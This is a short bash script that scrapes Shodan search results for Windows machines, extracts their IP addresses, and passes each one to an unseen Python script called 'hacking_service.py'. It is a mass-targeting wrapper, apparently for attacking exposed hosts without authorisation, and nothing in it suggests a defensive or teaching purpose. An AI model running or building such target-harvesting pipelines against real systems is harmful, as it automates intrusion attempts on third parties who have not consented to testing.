#!/bin/bash
links -dump https://shodan.io/search?query=windows | grep -Eo "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | xargs -iabc python3 hacking_service.py -d abc
